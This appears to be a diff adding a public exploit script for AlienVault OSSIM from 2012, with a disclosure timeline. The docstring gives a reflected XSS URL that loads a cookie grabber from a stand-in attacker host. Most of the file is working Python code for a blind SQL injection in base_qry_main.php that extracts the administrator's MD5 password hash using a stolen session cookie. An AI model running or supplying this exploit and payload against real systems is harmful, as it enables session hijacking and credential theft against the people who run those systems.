@@ -1,0 +1,130 @@
+#!/usr/bin/python
+
+'''
+AlienVault has a reflected XSS vulnerability in the "url" parameter of "top.php". 
+
+Proof of Concept:
+
+Enticing a logged in user to visit the following URL where an attacker is hosting an cookie grabber will allow for the hijacking of the user session:
+
+https://victim/ossim/top.php?option=3&soption=3&url=<script src=http://attacker/grabber.js></script>
+
+With a cookie captured and a session hijacked, the blind SQL injection vulnerability in the "tcp_port" parameter of "base_qry_main.php" can be exploited to extract the admin hash.
+
+Timeline:
+
+# 28 May 2012: Vulnerability reported to CERT
+# 30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
+# 23 Jul 2012: Update from CERT: No response from AlienVault
+# 23 Jul 2012: Public Disclosure
+
+Special Thanks to Tal Zeltzer
+
+When we access the vulnerable script at:
+
+https://victim/ossim/forensics/base_qry_main.php
+
+With an invalid sql statement in tcp_port[0][0] we see that there is an sql injection vulnerability
+[Todo]: Add here description on how we got the original query
+We concluded that since magic_quotes_gpc is enabled it will be difficult to obtain a shell quickly.
+We decided to take a different approach, we will modify the query in a way that it will only return rows
+If a specific field we are interested in has X as the Nth byte.
+To optimize the speed we used an algorithm called 'binary search'
+what we do is: (n being the Nth byte of the result string):
+    - check if X equals n
+    - If its not check if X is bigger than n
+    - If its not, X is smaller than n
+
+We used this algorithm to extract data from files using the LOAD_FILE function
+We also used this algorithm to extract the admin MD5 hashed password
+'''
+import sys,urllib2,urllib
+
+# Example 
+# https://victim/ossim/forensics/base_qry_main.php?tcp_port[0][0]=1=1) and 2 = mid((select pass from ossim.users where login=0x61646d696e),1,1)--&tcp_port[0][1]=layer4_dport&tcp_port[0][2]==&tcp_port[0][3]=17500&tcp_port[0][4]= &tcp_port[0][5]= &tcp_flags[0]= &layer4=TCP&num_result_rows=-1&current_view=-1&submit=QUERYDBP&sort_order=sig_a&clear_allcriteria=1&clear_criteria=time
+
+target = 'https://victim/ossim/forensics/base_qry_main.php'
+cookie = 'PHPSESSID=072af2ba52959b1602cc8fa864081d01'
+debug = False
+
+#
+# We use this function to output debug information if required
+#
+def debugOut(str, newLine = True):
+    if debug == True:
+        if newLine == True:
+            print str
+        else:
+            print str,
+
+#
+# Injects the given sql-query and check if the results were 'True' or 'False'
+#
+def sendSql(query):
+    global target, cookie           # We use the cookie and the target variables as globals
+    debugOut("Query: %s" % query)   # Print the query we execute for debugging
+    
+    values = { 'tcp_port[0][0]': query,             # This is our injection parameter
+               'tcp_port[0][1]': 'layer4_dport',
+               'tcp_port[0][2]': '=',
+               'tcp_port[0][3]': 17500,
+               'tcp_port[0][4]': ' ',
+               'tcp_port[0][5]': ' ',
+               'tcp_flags[0]': ' ',
+               'layer4': 'TCP',
+               'num_result_rows': -1,
+               'current_view': -1,
+               'submit': 'QUERYDBP',
+               'sort_order': 'sig_a',
+               'clear_allcriteria': 1,
+               'clear_criteria': 'time' }
+
+    url = "%s?%s" % (target, urllib.urlencode(values))  # Create the request url
+    req = urllib2.Request(url)                          # Create a request for the specified url
+    req.add_header('Cookie', cookie)                    # Add the cookie we stolen using XSS to identify ourselves
+    try:                                                # Exception handling
+        response = urllib2.urlopen(req)                 # Send the request and save the response object
+    except:                                             # In-case of an exception
+        print 'Failed to SQL inject'                    # Notify the user that there was an error
+        sys.exit(-1)                                    # Stop execution of our exploit
+    data = response.read()                  # Read the response data
+                                            # If the string 'No events...' is in not in our data the query is 'True'
+    return('No events matching your search criteria have been found' not in data)
+
+#
+# This function enumerates the value of a single nibble out of the admin hash
+# It uses the "binary search" algorithm to narrow down the number of requests we send
+#
+def enumerateNibble(subQuery, location, iMin = 0x00, iMax = 0x0F):
+    n = (iMin + iMax) / 2               # Get the middle of our range 
+    debugOut('Trying %d' % n, False)    # Notify what value is we comparing the nibble to
+                                # Test if the current value equals the nibble     
+    if sendSql('1=1) and %s = cast(conv(mid(%s,%d,1), 16, 10) as unsigned integer)--' % (n, subQuery, location)) == True:
+        debugOut('Equals!')             # If it is, notify 
+        return(hex(n)[2:])              # Return the hex representation of the nibble's value
+                                # Test if the current value is bigger than the nibble                                    
+    elif sendSql('1=1) and %s > cast(conv(mid(%s,%d,1),16,10) as unsigned integer)--' % (n, subQuery, location)) == True:
+        debugOut('Bigger than')                                     # If it is, notify
+        return(enumerateNibble(subQuery, location, iMin, n - 1))    # Use recursion to try again with the new reduced range
+    else:                       # If the current value is smaller than the nibble
+        debugOut('Smaller than')                                    # If it is, notify
+        return(enumerateNibble(subQuery, location, n + 1, iMax))    # Use recursion to try again with the new reduced range
+
+#
+# Do the actual enumeration of the admin-hash
+#
+def enumerateAdminHash():
+    hash = ''               # Initialize the 'hash' variable
+    for i in range(1,33):   # Iterate from 1 to 32 (the size of the md5 hash)
+                            # Append the nibble we enumerate from the given query
+                            # (This query retrives the administrator hash (obviously..)
+        hash += str(enumerateNibble('(select pass from ossim.users where login=0x61646d696e)', i))
+        print 'At %d, So far: %s' % (i, hash)   # Notify about our progress
+    return(hash)            # When done, return the hash we enumerated
+
+
+print "Trying to dump the administrator's hash"
+print "Note: If we get stuck or get invalid results it's probably due to an invalid session"
+hash = enumerateAdminHash()
+print "Administrator MD5 hash:"
+print "admin:%s" % hash
